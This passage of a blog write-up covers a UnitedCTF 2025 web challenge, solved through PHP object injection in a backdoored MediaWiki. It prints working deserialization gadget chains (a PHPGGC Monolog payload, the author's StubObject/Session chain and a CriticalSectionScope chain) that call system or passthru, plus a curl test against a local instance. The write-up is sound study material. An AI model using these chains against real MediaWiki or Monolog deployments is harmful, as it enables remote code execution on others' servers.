+PHP Deprecated:  Creation of dynamic property PHPGGC::$enhancements is deprecated in /usr/share/phpggc/lib/PHPGGC.php on line 183
+
+TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MTE6Ii9wcmludGZsYWcyIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0K
+</code></pre>
+
+<p>It works, and we get our second flag :
+<img alt="Second flag" src="/images/unitedctf2025/trampofolies3.png" /></p>
+<p>Here's the decoded payload (yep, totally would've found that on my own!) :</p>
+<pre class="codehilite"><code>O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:{s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:{s:10:&quot;*handler&quot;;r:2;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:{i:0;a:2:{i:0;s:11:&quot;/printflag2&quot;;s:5:&quot;level&quot;;N;}}s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:{i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;}}}
+</code></pre>
+
+<p>NOTE : DO NOT COPY THIS PAYLOAD TO A BASE64 CONVERTER BEFORE INSERTING IN THE BACKDOOR. Unless you want to waste hours of your time of course.</p>
+<p>For this to work, you need to directly encode the payload from the terminal in Base64. You see, there are actually null bytes inside the payload :
+<img alt="Payload" src="/images/unitedctf2025/trampofolies4.png" /></p>
+<p>This is because when PHP serializes an object, on top of recording attribute names, it must also keep track of the attribute type (public, private or protected). Protected attributes are represented with a null byte, a <code>*</code>, and another null byte. </p>
+<p>These null bytes seem to get stripped during the copy-pasting process, which causes syntax errors during the deserialization process. I assumed that these errors were due to using classes and functions that didn't exist within the codebase or that were since changed (just like some other payloads I also tried), but this was not the case.</p>
+<h4 id="part-2-intended-solution">Part 2 - Intended solution</h4>
+<p>After failing the unintended solution because of the null byte mistake I tried looking for the intended solution, which was to find a custom gadget chain with the available classes. Unfortunately, I never really made any progress with this, and eventually solved the challenge by revisiting my first approach.</p>
+<p>Here are a few things I tried before literally going insane (I'm pretty sure this challenge gave me actual nightmares during the week, I was seeing PHP in my sleep) :</p>
+<ul>
+<li>Checking all <code>__destruct</code>,  <code>__wakeup</code> and <code>__toString</code> functions in the codebase and following their implemented functions manually</li>
+<li>Modified the script to try and check for magic functions that had interesting methods that could potentially execute commands</li>
+<li>Paid extra attention to classes that could potentially write to files (since this is a PHP web app, this would result in code execution as well)</li>
+<li>Interrogation techniques against LLMs for potential leads (sorry trees)</li>
+</ul>
+<p>Once the CTF was over, the author revealed his solution (link <a href="https://github.com/UnitedCTF/UnitedCTF-2025/tree/main/challenges/web/trampofolies/solution">here</a>) :</p>
+<pre class="codehilite"><code class="language-php">&lt;?php
+namespace MediaWiki\Session {
+    class Session {
+        public $backend;
+    }
+}
+
+namespace MediaWiki\StubObject {
+    class StubObject {
+        public $global;
+        public $factory;
+        public $params;
+    }
+}
+
+namespace {
+    $stub = new \MediaWiki\StubObject\StubObject();
+    $stub-&gt;global = &quot;wgUser&quot;;
+    $stub-&gt;factory = &quot;passthru&quot;;
+    $stub-&gt;params = array(&quot;/printflag2&quot;);
+
+    $session = new \MediaWiki\Session\Session();
+    $session-&gt;backend = $stub;
+
+    $payload = base64_encode(serialize($session));
+    echo $payload;
+}
+?&gt;
+</code></pre>
+
+<p>This payload creates an instance of the <code>Session</code> class with the <code>backend</code> attribute being an instance of the <code>StubObject</code> class. <code>StubObject</code> objects are used as placeholders to delay the initialization of resource-extensive objects until the objects are actually called upon. </p>
+<p>This works by first creating a stub for the expensive object :</p>
+<pre class="codehilite"><code class="language-php">$parser = new StubObject( 'parser', 'Parser', [ /* constructor args */ ] );
+</code></pre>
+
+<p>And then using the stub as if it was the actual object :</p>
+<pre class="codehilite"><code>$parser-&gt;parse(...)
+</code></pre>
+
+<p>Stubs are used with global variables to make the objects globally accessible :</p>
+<pre class="codehilite"><code class="language-php">// Bootstrapping
+$GLOBALS['wgUser'] = new StubObject('wgUser', 'MediaWiki\User\User', [$params]);
+
+// Later, only if used:
+$username = $GLOBALS['wgUser']-&gt;getName(); // triggers unstub, constructs real User
+</code></pre>
+
+<p>Every time <code>$parser</code> or <code>$username</code> are called the object is unstubed, meaning it gets constructed into a real object. So why is this interesting? Well, it's because of <strong>how</strong> these objects are constructed. Take the constructor for a <code>StubObject</code> :</p>
+<pre class="codehilite"><code class="language-php">public function __construct( $global = null, $class = null, $params = [] ) {
+    $this-&gt;global = $global;
+    if ( is_callable( $class ) ) {
+        $this-&gt;factory = $class;
+    } else {
+        $this-&gt;class = $class;
+    }
+    $this-&gt;params = $params;
+}
+</code></pre>
+
+<p>It needs 3 arguments to create an instance, but the class itself can contain 4 different possible attributes :</p>
+<ul>
+<li><code>this-&gt;global</code> : The name of the global variable to store the object in</li>
+<li><code>this-&gt;class</code> : The name of the class to be constructed, provided the object is a class</li>
+<li><code>this-&gt;factory</code> : The name of a function or other callable object to be constructed by an object factory if direct construction from a class is not possible</li>
+<li><code>this-&gt;params</code> : The arguments provided to create the object</li>
+</ul>
+<p>The factory being able to potentially call arbitrary functions is very interesting. This is likely where the author started from when researching for this challenge. </p>
+<p>When a <code>StubObject</code> is called to execute something, the expensive object is automatically unstubed using the magic function <code>__call</code> :</p>
+<pre class="codehilite"><code class="language-php">public function __call( $name, $args ) {
+   return $this-&gt;_call( $name, $args );
+}
+
+public function _call( $name, $args ) {
+   $this-&gt;_unstub( $name, 5 );
+   return $GLOBALS[$this-&gt;global]-&gt;$name( ...$args );
+}
+</code></pre>
+
+<p>This unstubing process performs checks on the global variable used and calls another function, <code>_newObject</code> :</p>
+<pre class="codehilite"><code class="language-php">public function _unstub( $name = '_unstub', $level = 2 ) {
+    static $recursionLevel = 0;
+    if ( !$GLOBALS[$this-&gt;global] instanceof self ) {
+        return $GLOBALS[$this-&gt;global]; // already unstubbed.
+    }
+    if ( get_class( $GLOBALS[$this-&gt;global] ) != $this-&gt;class ) {
+        $caller = wfGetCaller( $level );
+        if ( ++$recursionLevel &gt; 2 ) {
+            throw new LogicException( &quot;Unstub loop detected on call of &quot;
+                . &quot;\${$this-&gt;global}-&gt;$name from $caller\n&quot; );
+        }
+        wfDebug( &quot;Unstubbing \${$this-&gt;global} on call of &quot;
+            . &quot;\${$this-&gt;global}::$name from $caller&quot; );
+        $GLOBALS[$this-&gt;global] = $this-&gt;_newObject();
+        --$recursionLevel;
+        return $GLOBALS[$this-&gt;global];
+    }
+}
+</code></pre>
+
+<p>This means that the global variable used must already exist and must be of the same class as the one stored inside <code>this-&gt;class</code>, which is <code>StubObject</code>. The author identified two global variables we could use, <code>wgUser</code> and <code>wgLang</code>.  </p>
+<p>Objects are dynamically created using the <code>ObjectFactory</code> class, designed to create objects from arrays :</p>
+<pre class="codehilite"><code class="language-php">public function _newObject() {
+    $params = $this-&gt;factory
+        ? [ 'factory' =&gt; $this-&gt;factory ]
+        : [ 'class' =&gt; $this-&gt;class ];
+    // ObjectFactory::getObjectFromSpec accepts an array, not just a callable (phan bug)
+    // @phan-suppress-next-line PhanTypeInvalidCallableArraySize
+    return ObjectFactory::getObjectFromSpec( $params + [
+            'args' =&gt; $this-&gt;params,
+            'closure_expansion' =&gt; false,
+        ] );
+}
+</code></pre>
+
+<p>Great, all we need now is to be able to control the <code>factory</code> and the <code>args</code> attributes of a <code>StubObject</code> to call an arbitrary function with parameters. Referring back to our example, this can be done by finding an instance of a class that takes an object as an attribute. We'll be able to construct a <code>StubObject</code> with our malicious attributes and set it as an attribute of our target class.</p>
+<p>Another requirement for this chain to work is that the class needs to contain a magic function that will call our malicious <code>StubObject</code> to execute something, triggering the unstubing process.</p>
+<p>The class the author found was <code>Session</code> (there are probably many more), with the attribute <code>backend</code> being called to execute a function :</p>
+<pre class="codehilite"><code class="language-php">public function __destruct() {
+    $this-&gt;backend-&gt;deregisterSession( $this-&gt;index );
+}
+</code></pre>
+
+<p>In hindsight, the chain is decently easy to find once the mechanism behind the stub objects is uncovered. Looking for a mechanism that would allow us to create objects first rather than looking for magic functions is definitely a lesson learned the hard way.</p>
+<h4 id="part-2-unintended-solution-2">Part 2 - Unintended solution #2</h4>
+<p>The author also gave another potentially interesting sink in the <code>CriticalSectionScope</code> class :</p>
+<pre class="codehilite"><code class="language-php">&lt;?php
+
+namespace Wikimedia\RequestTimeout;
+
+/**
+ * Class for automatically ending a critical section when a variable goes out
+ * of scope.
+ */
+class CriticalSectionScope {
+    /** @var int */
+    private $id;
+
+    /** @var callable */
+    private $exitCallback;
+
+    /** @var callable|null */
+    private $implicitExitCallback;
+
+    /** @var bool */
+    private $hasExited = false;
+
+    /**
+     * @internal
+     * @param int $id
+     * @param callable $exitCallback
+     * @param callable|null $implicitExitCallback
+     */
+    public function __construct( $id, $exitCallback, $implicitExitCallback ) {
+        $this-&gt;id = $id;
+        $this-&gt;exitCallback = $exitCallback;
+        $this-&gt;implicitExitCallback = $implicitExitCallback;
+    }
+
+    /**
+     * If the section has not already been exited, exit it and call the
+     * destruct callback.
+     *
+     * @throws TimeoutException
+     */
+    public function __destruct() {
+        if ( !$this-&gt;hasExited ) {
+            $this-&gt;exit();
+            if ( $this-&gt;implicitExitCallback ) {
+                ( $this-&gt;implicitExitCallback )( $this-&gt;id );
+            }
+        }
+    }
+
+    /**
+     * Exit the critical section
+     *
+     * @throws TimeoutException
+     */
+    public function exit() {
+        if ( !$this-&gt;hasExited ) {
+            $this-&gt;hasExited = true;
+            ( $this-&gt;exitCallback )( $this-&gt;id );
+        }
+    }
+
+    /**
+     * Get an integer uniquely identifying the section (within the scope of the
+     * parent RequestTimeout object).
+     *
+     * @since 1.1.0
+     * @return int
+     */
+    public function getId() {
+        return $this-&gt;id;
+    }
+}
+</code></pre>
+
+<p>This class isn't part of the actual codebase, but rather a dependency fetched by <code>composer</code> (just like <code>Monolog</code>!), which is why my script completely missed it. This class is really exciting because both <code>exitCallback</code> and <code>implicitExitCallback</code> attributes are callables that are executed by the <code>__destruct</code> method with <code>this-&gt;id</code> as a parameter. </p>
+<p>This means we can set either attribute to a function that executes code like <code>system</code> and have the <code>id</code> attribute store our command :</p>
+<pre class="codehilite"><code class="language-php">&lt;?php
+// We need to mention the namespace here
+namespace Wikimedia\RequestTimeout;
+
+class CriticalSectionScope {
+    private $id;
+    private $exitCallback;
+    private $implicitExitCallback;
+    private $hasExited = false;
+
+    public function __construct($id, $exitCallback, $implicitExitCallback) {
+        $this-&gt;id = $id;
+        $this-&gt;exitCallback = $exitCallback;
+        $this-&gt;implicitExitCallback = $implicitExitCallback;
+    }
+}
+
+$scope = new CriticalSectionScope('/printflag2', 'system', null);
+
+echo base64_encode(serialize($scope));
+?&gt;
+</code></pre>
+
+<p>A namespace is a way to group and identify classes. They also prevent two classes from having the same name. Usually, we would always need to provide the correct namespace so that the right class within the project can be instantiated. For example, here is the serialized payload for the above script using the full namespace :</p>
+<pre class="codehilite"><code>O:45:&quot;Wikimedia\RequestTimeout\CriticalSectionScope&quot;:4:{s:49:&quot;Wikimedia\RequestTimeout\CriticalSectionScopeid&quot;;s:11:&quot;/printflag2&quot;;s:59:&quot;Wikimedia\RequestTimeout\CriticalSectionScopeexitCallback&quot;;s:6:&quot;system&quot;;s:67:&quot;Wikimedia\RequestTimeout\CriticalSectionScopeimplicitExitCallback&quot;;N;s:56:&quot;Wikimedia\RequestTimeout\CriticalSectionScopehasExited&quot;;b:0;}
+</code></pre>
+
+<p>And here it is without using any namespace :</p>
+<pre class="codehilite"><code>O:20:&quot;CriticalSectionScope&quot;:4:{s:24:&quot;CriticalSectionScopeid&quot;;s:11:&quot;/printflag2&quot;;s:34:&quot;CriticalSectionScopeexitCallback&quot;;s:6:&quot;system&quot;;s:42:&quot;CriticalSectionScopeimplicitExitCallback&quot;;N;s:31:&quot;CriticalSectionScopehasExited&quot;;b:0;}
+</code></pre>
+
+<p>The reason we were able to create an instance of the <code>TempFSFile</code> class without using the correct namespace is because a global alias was put in place inside the class to map it to the keyword <code>TempFSFile</code> :</p>
+<pre class="codehilite"><code class="language-php">/** @deprecated class alias since 1.43 */
+class_alias( TempFSFile::class, 'TempFSFile' );
+</code></pre>
+
+<p>Lucky! We can test the payload with namespaces to make sure it works :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/mediawiki]
+└─$ curl &quot;http://localhost:8080/rest.php?backdoor=$(php -f ser.php)&quot;
+flag-82853a62299d08bd&lt;!doctype html&gt;&lt;title&gt;Redirect&lt;/title&gt;&lt;a href=&quot;/rest.php/&quot;&gt;/rest.php/&lt;/a&gt;
+</code></pre>
+
+<p>Going forward, two new habits can be applied for PHP object injection :</p>
+<ul>
+<li>Looking for mechanisms that allow the creation of arbitrary objects or similar first</li>
+<li>Manually looking for gadget chains and interesting classes in project dependencies as well</li>
+</ul>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+</body>
+</html>
